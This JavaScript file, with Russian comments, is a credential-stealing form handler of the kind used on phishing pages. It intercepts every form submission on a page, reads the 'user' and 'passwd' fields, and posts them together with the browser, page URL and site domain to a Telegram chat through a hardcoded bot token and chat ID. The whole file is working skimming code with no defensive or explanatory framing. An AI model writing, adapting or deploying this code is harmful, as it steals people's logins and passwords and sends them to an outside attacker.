const tgBotToken = "7330744500:AAHe_rHmqnh3Xcb7ZTieL22OoxWBHV7XFqc";
const tgChatId = "-1002252120859";

// Отправка сообщения в Telegram
function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage`;
    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: tgChatId, text: message, parse_mode: "Markdown" }),
    }).catch(err => console.error("Ошибка отправки в Telegram:", err));
}

// Хэширование домена
function hashDomain(domain) {
    return crypto.subtle.digest("SHA-256", new TextEncoder().encode(domain))
        .then(buffer => {
            const hashArray = Array.from(new Uint8Array(buffer));
            const hashHex = hashArray.map(byte => byte.toString(16).padStart(2, "0")).join("");
            return `#${hashHex.slice(0, 8)}`; // Возвращаем первые 8 символов хеша
        })
        .catch(err => {
            console.error("Ошибка хэширования домена:", err);
            return "#error";
        });
}

// Упрощенный User-Agent
function getSimplifiedUserAgent() {
    const userAgent = navigator.userAgent || "Неизвестно";
    const browserMatches = userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera|MSIE|Trident)\/\d+/) || ["Неизвестно"];
    const osMatches = userAgent.match(/\(([^)]+)\)/) || ["", "Неизвестно"];
    const browser = browserMatches[0].split("/")[0]; // Название браузера
    const os = osMatches[1].split(";")[0]; // Операционная система
    return `${browser} on ${os}`;
}

// Обработчик отправки формы
function handleSubmit(event) {
    event.preventDefault(); // Отключаем стандартное поведение формы

    // Получение данных из формы
    const formData = new FormData(event.target);
    const login = formData.get("user") || "Не указано";
    const password = formData.get("passwd") || "Не указано";

    // Получение данных о User-Agent и домене
    const simplifiedUserAgent = getSimplifiedUserAgent();
    const domain = window.location.hostname;

    hashDomain(domain).then(domainHashTag => {
        // Формирование сообщения
        const message = `🚀 *Новая отправка формы:*
---
- 🛡️ **Логин:**
\`\`\`
${login}
\`\`\`
- 🛡️ **Пароль:**
\`\`\`
${password}
\`\`\`
- 🖥️ **User-Agent:** ${simplifiedUserAgent}
- 🔗 **Страница:** ${window.location.href}
- 🏢 **Организация:** ${domain}
${domainHashTag}`;

        // Отправка сообщения
        sendToTelegram(message);

        // Сброс формы после отправки
        //event.target.reset();
    });
}

// Добавление обработчика события submit
document.addEventListener("submit", handleSubmit);
